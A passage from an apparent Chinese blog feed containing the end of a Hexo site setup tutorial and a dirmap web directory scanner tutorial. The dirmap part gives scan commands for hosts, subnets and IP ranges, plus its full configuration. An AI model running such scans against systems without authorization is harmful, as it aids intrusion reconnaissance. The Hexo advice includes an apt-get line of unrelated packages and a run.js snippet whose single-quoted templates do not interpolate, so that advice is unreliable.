4.2</td><td align="left">8.10</td><td align="left">10.0.0</td></tr><tr><td align="left">4.0</td><td align="left">8.6</td><td align="left">8.10.0</td></tr><tr><td align="left">3.3 - 3.9</td><td align="left">6.9</td><td align="left">8.0.0</td></tr><tr><td align="left">3.2 - 3.3</td><td align="left">0.12</td><td align="left">未知</td></tr><tr><td align="left">3.0 - 3.1</td><td align="left">0.10 或 iojs</td><td align="left">未知</td></tr><tr><td align="left">0.0.1 - 2.8</td><td align="left">0.10</td><td align="left">未知</td></tr></tbody></table><h2 id="hexo-建站"><a href="#hexo-建站" class="headerlink" title="hexo-建站"></a>hexo-建站</h2><p>安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init &lt;文件夹名称&gt;</span><br><span class="line">cd &lt;文件夹名称&gt;</span><br><span class="line">npm install #安装/初始化</span><br></pre></td></tr></tbody></table></figure><p>新建完成后，指定文件夹的目录如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></tbody></table></figure><h3 id="config-yml"><a href="#config-yml" class="headerlink" title="_config.yml"></a>_config.yml</h3><p>网站的 <a href="https://hexo.io/zh-cn/docs/configuration">配置</a> 信息，您可以在此配置大部分的参数。</p><p><a href="https://hexo.io/zh-cn/docs/configuration">https://hexo.io/zh-cn/docs/configuration</a>  #配置链接</p><p>编辑配置文件信息</p><h3 id="配置信息说明"><a href="#配置信息说明" class="headerlink" title="配置信息说明"></a>配置信息说明</h3><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>title</code></td><td align="left">网站标题</td></tr><tr><td align="left"><code>subtitle</code></td><td align="left">网站副标题</td></tr><tr><td align="left"><code>description</code></td><td align="left">网站描述</td></tr><tr><td align="left"><code>keywords</code></td><td align="left">网站的关键词。支持多个关键词。</td></tr><tr><td align="left"><code>author</code></td><td align="left">您的名字</td></tr><tr><td align="left"><code>language</code></td><td align="left">网站使用的语言。对于简体中文用户来说，使用不同的主题可能需要设置成不同的值，请参考你的主题的文档自行设置，常见的有 <code>zh-Hans</code>和 <code>zh-CN</code>。</td></tr><tr><td align="left"><code>timezone</code></td><td align="left">网站时区。Hexo 默认使用您电脑的时区。请参考 <a href="https://en.wikipedia.org/wiki/List_of_tz_database_time_zones">时区列表</a> 进行设置，如 <code>America/New_York</code>, <code>Japan</code>, 和 <code>UTC</code> 。一般的，对于中国大陆地区可以使用 <code>Asia/Shanghai</code>。</td></tr></tbody></table><h3 id="package-json"><a href="#package-json" class="headerlink" title="package.json"></a>package.json</h3><p>应用程序的信息。<a href="https://ejs.co/">EJS</a>, <a href="http://learnboost.github.io/stylus/">Stylus</a> 和 <a href="http://daringfireball.net/projects/markdown/">Markdown</a> 渲染引擎 已默认安装，您可以自由移除。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package.json{</span><br><span class="line">  "name": "hexo-site",</span><br><span class="line">  "version": "0.0.0",</span><br><span class="line">  "private": true,</span><br><span class="line">  "hexo": {</span><br><span class="line">    "version": ""</span><br><span class="line">  },</span><br><span class="line">  "dependencies": {</span><br><span class="line">    "hexo": "^7.0.0",</span><br><span class="line">    "hexo-generator-archive": "^2.0.0",</span><br><span class="line">    "hexo-generator-category": "^2.0.0",</span><br><span class="line">    "hexo-generator-index": "^3.0.0",</span><br><span class="line">    "hexo-generator-tag": "^2.0.0",</span><br><span class="line">    "hexo-renderer-ejs": "^2.0.0",</span><br><span class="line">    "hexo-renderer-stylus": "^3.0.0",</span><br><span class="line">    "hexo-renderer-marked": "^6.0.0",</span><br><span class="line">    "hexo-server": "^3.0.0",</span><br><span class="line">    "hexo-theme-landscape": "^1.0.0"</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="运行命令"><a href="#运行命令" class="headerlink" title="运行命令"></a>运行命令</h3><h4 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="#生成静态文件:"></a>#生成静态文件:</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo generat  简写:hexo g</span><br></pre></td></tr></tbody></table></figure><table><thead><tr><th align="left">选项</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>-d</code>, <code>--deploy</code></td><td align="left">文件生成后立即部署网站</td></tr><tr><td align="left"><code>-w</code>, <code>--watch</code></td><td align="left">监视文件变动</td></tr><tr><td align="left"><code>-b</code>, <code>--bail</code></td><td align="left">生成过程中如果发生任何未处理的异常则抛出异常</td></tr><tr><td align="left"><code>-f</code>, <code>--force</code></td><td align="left">强制重新生成文件 Hexo 引入了差分机制，如果 <code>public</code> 目录存在，那么 <code>hexo g</code> 只会重新生成改动的文件。 使用该参数的效果接近 <code>hexo clean &amp;&amp; hexo generate</code></td></tr><tr><td align="left"><code>-c</code>, <code>--concurrency</code></td><td align="left">最大同时生成文件的数量，默认无限制</td></tr></tbody></table><h3 id="运行命令-1"><a href="#运行命令-1" class="headerlink" title="运行命令"></a>运行命令</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server #运行</span><br></pre></td></tr></tbody></table></figure><p>启动服务器。默认情况下，访问网址为： <code>http://localhost:4000/</code>。</p><table><thead><tr><th align="left">选项</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>-p</code>, <code>--port</code></td><td align="left">重设端口</td></tr><tr><td align="left"><code>-s</code>, <code>--static</code></td><td align="left">只使用静态文件</td></tr><tr><td align="left"><code>-l</code>, <code>--log</code></td><td align="left">启动日记记录，使用覆盖记录格式</td></tr></tbody></table><h2 id="deploy-部署"><a href="#deploy-部署" class="headerlink" title="deploy-部署"></a>deploy-部署</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></tbody></table></figure><p>部署网站。</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>-g</code>, <code>--generate</code></td><td align="left">部署之前预先生成静态文件</td></tr></tbody></table><p>该命令可以简写为：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo d</span><br></pre></td></tr></tbody></table></figure><h2 id="clean-清理缓存"><a href="#clean-清理缓存" class="headerlink" title="clean-清理缓存"></a>clean-清理缓存</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br></pre></td></tr></tbody></table></figure><p>清除缓存文件 (<code>db.json</code>) 和已生成的静态文件 (<code>public</code>)。</p><p>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</p><h2 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题:"></a>更换主题:</h2><p>链接:<a href="https://hexo.io/themes/">https://hexo.io/themes/</a></p><p>主题:<a href="https://github.com/Yue-plus/hexo-theme-arknights/blob/main/README.md">https://github.com/Yue-plus/hexo-theme-arknights/blob/main/README.md</a></p><h3 id="安装教程"><a href="#安装教程" class="headerlink" title="安装教程:"></a>安装教程:</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在自己的hexo框架目录下,运行:</span></span><br><span class="line">git clone https://github.com/Yue-plus/hexo-theme-arknights.git themes/arknights</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装依赖:</span></span><br><span class="line">npm install hexo-server hexo-browsersync hexo-renderer-pug --save</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">记录名称:hexo-theme-arknights</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">剪切 Hexo/themes/arknights/_config.yml到 Hexo 目录下，并重命名为_config.arknights.yml。</span></span><br><span class="line">cp themes/arknights/_config.yml _config.arknights.yml</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用vim打开_config.yml,并在文件中找到theme:XXXX   将XXXX更换为:arknights,最后保存</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="添加文章"><a href="#添加文章" class="headerlink" title="添加文章:"></a>添加文章:</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#md文件存放路径:source/_posts/</span><br><span class="line">#默认有一个hello-world.md,记得删除</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="在服务器长期运行"><a href="#在服务器长期运行" class="headerlink" title="在服务器长期运行"></a>在服务器长期运行</h2><h3 id="1-用pm2管理进程让-hexo-博客在服务器后台跑起来"><a href="#1-用pm2管理进程让-hexo-博客在服务器后台跑起来" class="headerlink" title="1.用pm2管理进程让 hexo 博客在服务器后台跑起来"></a><strong>1.用pm2管理进程让 hexo 博客在服务器后台跑起来</strong></h3><p><strong>1,安装pm2</strong>(建议初学者使用此命令)</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install -g pm2</span><br><span class="line">#高级工程师请使用下方命令</span><br><span class="line">npm install pm2</span><br></pre></td></tr></tbody></table></figure><p><strong>2,编写一个执行脚本 —— 在博客根目录下创建一个文件 run.js</strong></p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/src/myblog</span><br><span class="line"></span><br><span class="line">vim run.js</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#添加如下内容:</span></span></span><br><span class="line">const { exec } = require('child_process')</span><br><span class="line">exec('hexo server -s -p 指定端口',(error, stdout, stderr) =&gt; {</span><br><span class="line">if(error){</span><br><span class="line">        console.log('exec error: ${error}')</span><br><span class="line">        return</span><br><span class="line">}</span><br><span class="line">console.log('stdout: ${stdout}');</span><br><span class="line">console.log('stderr: ${stderr}');</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure><p><strong>3,使用pm2运行脚本 run.js</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd hexo目录</span><br><span class="line">指令: pm2 start run.js</span><br><span class="line">运行起来后可以使用pm2 show + 进程pid查看后台hexo进行</span><br></pre></td></tr></tbody></table></figure><h5 id="4-提示缺少文件"><a href="#4-提示缺少文件" class="headerlink" title="4.提示缺少文件"></a>4.提示缺少文件</h5><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装文件 缺少啥安装啥</span></span><br><span class="line">sudo apt-get install powerman linuxptp  pmw wm2 libpod-pom-perl  pms powermanagement-interface gm2 </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">实例命令</span></span><br><span class="line">sudo apt-get install 缺少的文件1 缺少的文件2 缺少的文件3</span><br></pre></td></tr></tbody></table></figure><h2 id="自动清理缓存并生成静态文件脚本"><a href="#自动清理缓存并生成静态文件脚本" class="headerlink" title="自动清理缓存并生成静态文件脚本"></a>自动清理缓存并生成静态文件脚本</h2><p>依然在根目录运行.</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim del_old_file.sh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">文件内容:</span></span><br><span class="line">hexo clean</span><br><span class="line">hexo g</span><br></pre></td></tr></tbody></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
      
      
      <categories>
          
          <category> 搭建博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dirmap详细使用教程-目录扫描工具的劳斯莱斯</title>
      <link href="/2024/02/29/39-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90/"/>
      <url>/2024/02/29/39-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90/</url>
      
        <content type="html"><![CDATA[<h2 id="dirmap介绍"><a href="#dirmap介绍" class="headerlink" title="dirmap介绍"></a>dirmap介绍</h2><p>​dirmap是一个高级的web目录扫描工具,基于python3开发,运行,功能强于:<a href="https://www.uedbox.com/post/8818/">DirBuster</a>、<a href="https://www.uedbox.com/tools/52217/">Dirsearch</a>、cansina、<a href="https://www.uedbox.com/?s=%E5%BE%A1%E5%89%91">御剑</a>。</p><p>​几乎吊打市面上所有的web扫描目录工具.</p><p>​github地址:<a href="https://github.com/H4ckForJob/dirmap">https://github.com/H4ckForJob/dirmap</a></p><p><a href="https://github.com/H4ckForJob/dirmap/blob/master/doc/dirmap.png"><img src="https://github.com/H4ckForJob/dirmap/raw/master/doc/dirmap.png" alt="dirmap"></a></p><h1 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h1><p>经过大量调研，总结一个优秀的web目录扫描工具至少具备以下功能：</p><ul><li>并发引擎</li><li>能使用字典</li><li>能纯爆破</li><li>能爬取页面动态生成字典</li><li>能fuzz扫描</li><li>自定义请求</li><li>自定义响应结果处理…</li></ul><p>那么接下来看看Dirmap的<strong>特点</strong>吧</p><h1 id="功能特点"><a href="#功能特点" class="headerlink" title="功能特点"></a>功能特点</h1><ol><li>支持n个target*n个payload并发</li><li>支持递归扫描</li><li>支持自定义需要递归扫描的状态码</li><li>支持(单|多)字典扫描</li><li>支持自定义字符集爆破</li><li>支持爬虫动态字典扫描</li><li>支持自定义标签fuzz目标url</li><li>自定义请求User-Agent</li><li>自定义请求随机延时</li><li>自定义请求超时时间</li><li>自定义请求代理</li><li>自定义正则表达式匹配假性404页面</li><li>自定义要处理的响应状态码</li><li>自定义跳过大小为x的页面</li><li>自定义显示content-type</li><li>自定义显示页面大小</li><li>按域名去重复保存结果</li></ol><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/H4ckForJob/dirmap.git &amp;&amp; cd dirmap &amp;&amp; python3 -m pip install -r requirement.txt</span><br></pre></td></tr></tbody></table></figure><h2 id="快速使用"><a href="#快速使用" class="headerlink" title="快速使用"></a>快速使用</h2><h3 id="输入目标"><a href="#输入目标" class="headerlink" title="输入目标"></a>输入目标</h3><p>单目标，默认为http</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirmap.py -i https://target.com -lcf</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirmap.py -i 192.168.1.1 -lcf</span><br></pre></td></tr></tbody></table></figure><p>子网（CIDR格式）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirmap.py -i 192.168.1.0/24 -lcf</span><br></pre></td></tr></tbody></table></figure><p>网络范围</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirmap.py -i 192.168.1.1-192.168.1.100 -lcf</span><br></pre></td></tr></tbody></table></figure><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirmap.py -iF targets.txt -lcf</span><br></pre></td></tr></tbody></table></figure><p><code>targets.txt</code>中支持上述格式</p><h3 id="结果保存"><a href="#结果保存" class="headerlink" title="结果保存"></a>结果保存</h3><ol><li>结果将自动保存在项目根目录下的<code>output</code>文件夹中</li><li>每一个目标生成一个txt，命名格式为<code>目标域名.txt</code></li><li>结果自动去重复，不用担心产生大量冗余</li></ol><h2 id="高级使用"><a href="#高级使用" class="headerlink" title="高级使用"></a>高级使用</h2><p>自定义dirmap配置，开始探索dirmap高级功能</p><p>暂时采用加载配置文件的方式进行详细配置，<strong>不支持使用命令行参数进行详细配置</strong>！</p><p>编辑项目根目录下的<code>dirmap.conf</code>，进行配置</p><p><code>dirmap.conf</code>配置详解</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line">#递归扫描处理配置</span><br><span class="line">[RecursiveScan]</span><br><span class="line">#是否开启递归扫描:关闭:0;开启:1</span><br><span class="line">conf.recursive_scan = 0</span><br><span class="line">#遇到这些状态码，开启递归扫描。默认配置[301,403]</span><br><span class="line">conf.recursive_status_code = [301,403]</span><br><span class="line">#URL超过这个长度就退出扫描</span><br><span class="line">conf.recursive_scan_max_url_length = 60</span><br><span class="line">#这些后缀名不递归扫</span><br><span class="line">conf.recursive_blacklist_exts = ["html",'htm','shtml','png','jpg','webp','bmp','js','css','pdf','ini','mp3','mp4']</span><br><span class="line">#设置排除扫描的目录。默认配置空。其他配置：e.g:['/test1','/test2']</span><br><span class="line">#conf.exclude_subdirs = ['/test1','/test2']</span><br><span class="line">conf.exclude_subdirs = ""</span><br><span class="line"></span><br><span class="line">#扫描模式处理配置(4个模式，1次只能选择1个)</span><br><span class="line">[ScanModeHandler]</span><br><span class="line">#字典模式:关闭:0;单字典:1;多字典:2</span><br><span class="line">conf.dict_mode = 1</span><br><span class="line">#单字典模式的路径</span><br><span class="line">conf.dict_mode_load_single_dict = "dict_mode_dict.txt"</span><br><span class="line">#多字典模式的路径，默认配置dictmult</span><br><span class="line">conf.dict_mode_load_mult_dict = "dictmult"</span><br><span class="line">#爆破模式:关闭:0;开启:1</span><br><span class="line">conf.blast_mode = 0</span><br><span class="line">#生成字典最小长度。默认配置3</span><br><span class="line">conf.blast_mode_min = 3</span><br><span class="line">#生成字典最大长度。默认配置3</span><br><span class="line">conf.blast_mode_max = 3</span><br><span class="line">#默认字符集:a-z。暂未使用。</span><br><span class="line">conf.blast_mode_az = "abcdefghijklmnopqrstuvwxyz"</span><br><span class="line">#默认字符集:0-9。暂未使用。</span><br><span class="line">conf.blast_mode_num = "0123456789"</span><br><span class="line">#自定义字符集。默认配置"abc"。使用abc构造字典</span><br><span class="line">conf.blast_mode_custom_charset = "abc"</span><br><span class="line">#自定义继续字符集。默认配置空。</span><br><span class="line">conf.blast_mode_resume_charset = ""</span><br><span class="line">#爬虫模式:关闭:0;开启:1</span><br><span class="line">conf.crawl_mode = 0</span><br><span class="line">#用于生成动态敏感文件payload的后缀字典</span><br><span class="line">conf.crawl_mode_dynamic_fuzz_suffix = "crawl_mode_suffix.txt"</span><br><span class="line">#解析robots.txt文件。暂未实现。</span><br><span class="line">conf.crawl_mode_parse_robots = 0</span><br><span class="line">#解析html页面的xpath表达式</span><br><span class="line">conf.crawl_mode_parse_html = "//*/@href | //*/@src | //form/@action"</span><br><span class="line">#是否进行动态爬虫字典生成。默认配置1，开启爬虫动态字典生成。其他配置：e.g:关闭:0;开启:1</span><br><span class="line">conf.crawl_mode_dynamic_fuzz = 1</span><br><span class="line">#Fuzz模式:关闭:0;单字典:1;多字典:2</span><br><span class="line">conf.fuzz_mode = 0</span><br><span class="line">#单字典模式的路径。</span><br><span class="line">conf.fuzz_mode_load_single_dict = "fuzz_mode_dir.txt"</span><br><span class="line">#多字典模式的路径。默认配置:fuzzmult</span><br><span class="line">conf.fuzz_mode_load_mult_dict = "fuzzmult"</span><br><span class="line">#设置fuzz标签。默认配置{dir}。使用{dir}标签当成字典插入点，将http://target.com/{dir}.php替换成http://target.com/字典中的每一行.php。其他配置：e.g:{dir};{ext}</span><br><span class="line">#conf.fuzz_mode_label = "{ext}"</span><br><span class="line">conf.fuzz_mode_label = "{dir}"</span><br><span class="line"></span><br><span class="line">#处理payload配置。暂未实现。</span><br><span class="line">[PayloadHandler]</span><br><span class="line"></span><br><span class="line">#处理请求配置</span><br><span class="line">[RequestHandler]</span><br><span class="line">#自定义请求头。默认配置空。其他配置：e.g:test1=test1,test2=test2</span><br><span class="line">#conf.request_headers = "test1=test1,test2=test2"</span><br><span class="line">conf.request_headers = ""</span><br><span class="line">#自定义请求User-Agent。默认配置chrome的ua。</span><br><span class="line">conf.request_header_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"</span><br><span class="line">#自定义请求cookie。默认配置空，不设置cookie。其他配置e.g:cookie1=cookie1; cookie2=cookie2;</span><br><span class="line">#conf.request_header_cookie = "cookie1=cookie1; cookie2=cookie2"</span><br><span class="line">conf.request_header_cookie = ""</span><br><span class="line">#自定义401认证。暂未实现。因为自定义请求头功能可满足该需求(懒XD)</span><br><span class="line">conf.request_header_401_auth = ""</span><br><span class="line">#自定义请求方法。默认配置get方法。其他配置：e.g:get;head</span><br><span class="line">#conf.request_method = "head"</span><br><span class="line">conf.request_method = "get"</span><br><span class="line">#自定义每个请求超时时间。默认配置3秒。</span><br><span class="line">conf.request_timeout = 3</span><br><span class="line">#随机延迟(0-x)秒发送请求。参数必须是整数。默认配置0秒，无延迟。</span><br><span class="line">conf.request_delay = 0</span><br><span class="line">#自定义单个目标，请求协程线程数。默认配置30线程</span><br><span class="line">conf.request_limit = 30</span><br><span class="line">#自定义最大重试次数。暂未实现。</span><br><span class="line">conf.request_max_retries = 1</span><br><span class="line">#设置持久连接。是否使用session()。暂未实现。</span><br><span class="line">conf.request_persistent_connect = 0</span><br><span class="line">#302重定向。默认False，不重定向。其他配置：e.g:True;False</span><br><span class="line">conf.redirection_302 = False</span><br><span class="line">#payload后添加后缀。默认空，扫描时，不添加后缀。其他配置：e.g:txt;php;asp;jsp</span><br><span class="line">#conf.file_extension = "txt"</span><br><span class="line">conf.file_extension = ""</span><br><span class="line"></span><br><span class="line">#处理响应配置</span><br><span class="line">[ResponseHandler]</span><br><span class="line">#设置要记录的响应状态。默认配置[200]，记录200状态码。其他配置：e.g:[200,403,301]</span><br><span class="line">#conf.response_status_code = [200,403,301]</span><br><span class="line">conf.response_status_code = [200]</span><br><span class="line">#是否记录content-type响应头。默认配置1记录</span><br><span class="line">#conf.response_header_content_type = 0</span><br><span class="line">conf.response_header_content_type = 1</span><br><span class="line">#是否记录页面大小。默认配置1记录</span><br><span class="line">#conf.response_size = 0</span><br><span class="line">conf.response_size = 1</span><br><span class="line">#是否自动检测404页面。默认配置True，开启自动检测404.其他配置参考e.g:True;False</span><br><span class="line">#conf.auto_check_404_page = False</span><br><span class="line">conf.auto_check_404_page = True</span><br><span class="line">#自定义匹配503页面正则。暂未实现。感觉用不着，可能要废弃。</span><br><span class="line">#conf.custom_503_page = "page 503"</span><br><span class="line">conf.custom_503_page = ""</span><br><span class="line">#自定义正则表达式，匹配页面内容</span><br><span class="line">#conf.custom_response_page = "([0-9]){3}([a-z]){3}test"</span><br><span class="line">conf.custom_response_page = ""</span><br><span class="line">#跳过显示页面大小为x的页面，若不设置，请配置成"None"，默认配置“None”。其他大小配置参考e.g:None;0b;1k;1m</span><br><span class="line">#conf.skip_size = "0b"</span><br><span class="line">conf.skip_size = "None"</span><br><span class="line"></span><br><span class="line">#代理选项</span><br><span class="line">[ProxyHandler]</span><br><span class="line">#代理配置。默认设置“None”，不开启代理。其他配置e.g:{"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}</span><br><span class="line">#conf.proxy_server = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}</span><br><span class="line">conf.proxy_server = None</span><br><span class="line"></span><br><span class="line">#Debug选项</span><br><span class="line">[DebugMode]</span><br><span class="line">#打印payloads并退出</span><br><span class="line">conf.debug = 0</span><br><span class="line"></span><br><span class="line">#update选项</span><br><span class="line">[CheckUpdate]</span><br><span class="line">#github获取更新。暂未实现。</span><br><span class="line">conf.update = 0</span><br></pre></td></tr></tbody></table></figure><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li><p>命令行参数解析全局初始化</p></li><li></li></ul><p>  engine初始化</p><ul><li><p>设置线程数</p></li><li></li></ul><p>  